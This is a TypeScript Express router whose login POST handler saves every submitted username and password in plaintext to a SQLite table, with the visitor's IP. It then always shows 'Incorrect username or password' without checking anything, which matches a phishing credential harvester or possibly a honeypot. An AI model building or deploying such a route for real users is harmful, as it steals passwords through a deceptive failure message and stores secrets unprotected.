import express from 'express';
import { getLogin } from '../controllers/Controller';
import { Database } from 'sqlite3';

const db = new Database('db.sqlite');
const router = express.Router();

router.use((req, res, next) => {
  console.log('Time:', Date.now());
  next();
});

router.get('/', getLogin);
router.post('/', async (req, res) => { // Ensure the correct path
  let username = req.body.username;
  let password = req.body.password;
  let ip = req.ip;
  let method = req.method;
  let path = req.path;

  db.run(
    `CREATE TABLE IF NOT EXISTS logins (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL,
      password TEXT NOT NULL,
      ip TEXT NOT NULL,
      method TEXT NOT NULL,
      path TEXT NOT NULL,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )`,
  );

  db.run(
    `INSERT INTO logins (username, password, ip, method, path) VALUES (?, ?, ?, ?, ?)`,
    [username, password, ip, method, path],
    function (err) {
      if (err) {
        return console.error(err.message);
      }
      console.log(`A row has been inserted with rowid ${this.lastID}`);
    }
  );


    res.render('loginpage', { error: 'Incorrect username or password' });

});

export default router;
